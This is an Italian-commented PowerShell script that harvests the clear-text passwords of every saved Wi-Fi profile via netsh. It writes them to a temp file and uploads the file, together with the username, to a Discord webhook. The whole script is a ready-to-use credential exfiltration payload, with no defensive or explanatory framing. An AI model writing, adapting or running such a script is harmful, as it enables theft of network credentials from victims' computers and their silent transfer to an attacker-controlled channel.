############################################################################################################################################################
# Estrae le password dei profili Wi-Fi e le salva in un file temporaneo
$wifiProfiles = (netsh wlan show profiles) | 
    Select-String "\:(.+)$" | 
    ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $profileInfo = netsh wlan show profile name="$name" key=clear
        $pass = ($profileInfo | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
        
        [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
    } | 
    Format-Table -AutoSize | 
    Out-String 

# Salva i profili Wi-Fi e le password in un file temporaneo
$env:TEMP\wifi-passwords.txt
Out-File -FilePath "$env:TEMP\wifi-passwords.txt" -InputObject $wifiProfiles

############################################################################################################################################################

# Funzione per caricare le password su Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$True)] [string]$file,
        [parameter(Position=1, Mandatory=$False)] [string]$text
    )

    $hookurl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    # Invia il messaggio di testo
    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Carica il file delle password
    if (-not [string]::IsNullOrEmpty($file)) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Carica le password su Discord
if (Test-Path "$env:TEMP\wifi-passwords.txt") {
    Upload-Discord -file "$env:TEMP\wifi-passwords.txt" -text "Ecco le password dei profili Wi-Fi salvati:"
}

############################################################################################################################################################

# Opzionale: Visualizza un messaggio indicante la fine dell'operazione
Write-Host "Le password Wi-Fi sono state inviate a Discord."

